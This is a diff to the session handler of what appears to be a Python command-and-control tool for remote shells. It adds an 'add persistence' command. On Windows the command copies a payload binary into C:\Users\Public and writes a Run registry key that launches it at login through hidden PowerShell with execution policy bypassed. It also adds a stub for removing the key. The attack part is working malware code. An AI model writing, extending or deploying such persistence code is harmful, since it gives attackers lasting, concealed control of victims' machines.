@@ -75,14 +75,48 @@ def message_handler():
 
 def session_handler(session_id):
     while True:
-        message = input('send message#> ')
+        message = input('Session command#> ')
         if message == 'exit':
             outbound_message(session_id, message)
             session_id.close()
             break
-        elif message == 'background':
+        if message == 'background':
             break
-        elif not message:
+        if message == 'help':
+            message = ''
+            print('Help menu here!')
+            pass
+        if message == 'add persistence':
+            if sessions[num - 1][5] == 'Windows':
+                payload_name = input(
+                    '[*] Enter the name of the binary in current directory to be add to persistence: ')
+                message = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
+                session_id.send(message.encode())
+                response = inbound_message(session_id)
+                time.sleep(1)
+                if f'The system cannot find' not in response:
+                    print(response)
+                    message = f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v knock /t REG_SZ /d "powershell -exec bypass -nop -w hidden C:\\Users\\Public\\{payload_name}"'
+                    print(
+                        f'[!] Trying to add {payload_name} as a start-up binary. Please run <remove persistence> to clean up the registry [!]')
+            else:
+                payload_name = input(
+                    '[*] Enter the name of the python file in current directory to be add to persistence: ')
+                message = f'echo "Performing persistence command for non-windows"'
+
+        if message == 'remove persistence':
+            print('[!] Not yet implemented')
+            print('[!] Run the following command to clean up the registry: \nreg delete "HKEY_CURRENT_USER\\Software\Microsoft\\Windows\\CurrentVersion\\Run" /v knock /f')
+            message = ''
+            # if sessions[num - 1][5] == 'Windows':
+            #     message = f'cmd.exe /c del C:\\Users\\Public\\{payload_name}'
+            #     session_id.send(message.encode())
+            #     response = inbound_message(session_id)
+            #     print(response)
+            #     time.sleep(1)
+            #     message = f'reg delete "HKEY_CURRENT_USER\\Software\Microsoft\\Windows\\CurrentVersion\\Run" /v knock /f'
+            #     print('[!] Trying to clean up the registry [!]')
+        if not message:
             continue
         outbound_message(session_id, message)
 
